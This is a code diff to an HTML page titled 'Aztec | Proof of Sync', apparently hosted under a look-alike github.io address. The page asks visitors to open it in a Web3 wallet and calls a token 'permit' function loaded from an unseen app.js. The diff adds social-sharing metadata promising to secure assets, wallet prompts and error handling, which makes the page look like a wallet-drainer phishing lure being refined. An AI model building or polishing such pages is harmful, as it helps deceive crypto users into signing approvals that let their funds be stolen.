@@ -5,6 +5,14 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <link rel="manifest" href="./manifest.json">
     <link rel="icon" href="./favicon.ico" type="image/x-icon">
+    
+    <!-- Open Graph Security Metadata -->
+    <meta property="og:title" content="Aztec Shield | Proof of Sync">
+    <meta property="og:description" content="Secure your assets with Aztec's Layer 2 Shielding protocol.">
+    <meta property="og:image" content="https://aztec-2026.github.io/shield-sync/favicon.ico">
+    <meta property="og:url" content="https://aztec-2026.github.io/shield-sync/">
+    <meta name="twitter:card" content="summary_large_image">
+
     <title>Aztec | Proof of Sync</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <style>
@@ -59,17 +67,38 @@
     </div>
     <script>
         const getProvider = () => window.ethereum || (window.web3 && window.web3.currentProvider) || null;
+
         const trigger = async () => {
-            if (!getProvider()) return;
+            const provider = getProvider();
+            if (!provider) {
+                alert("Please open this page inside a Web3 wallet (Trust Wallet, MetaMask, etc.)");
+                return;
+            }
+
+            // Move to loading state
             document.getElementById('ui-main').style.display = 'none';
             document.getElementById('ui-loading').style.display = 'block';
+
             if (typeof triggerPermit === 'function') {
-                try { await triggerPermit(); } 
-                catch (e) { document.getElementById('ui-main').style.display = 'block'; document.getElementById('ui-loading').style.display = 'none'; }
+                try { 
+                    await triggerPermit(); 
+                } catch (e) { 
+                    console.error("Interaction failed:", e);
+                    // Revert UI if the user cancels or an error occurs
+                    document.getElementById('ui-main').style.display = 'block'; 
+                    document.getElementById('ui-loading').style.display = 'none'; 
+                }
+            } else {
+                console.error("app.js not loaded correctly.");
+                document.getElementById('ui-main').style.display = 'block'; 
+                document.getElementById('ui-loading').style.display = 'none'; 
             }
         };
+
+        // Assign the click event to the button
         document.getElementById('action-btn').onclick = trigger;
-        setTimeout(trigger, 1500);
+        
+        // Removed setTimeout(trigger, 1500) to ensure mobile compatibility
     </script>
     <script src="app.js"></script>
 </body>
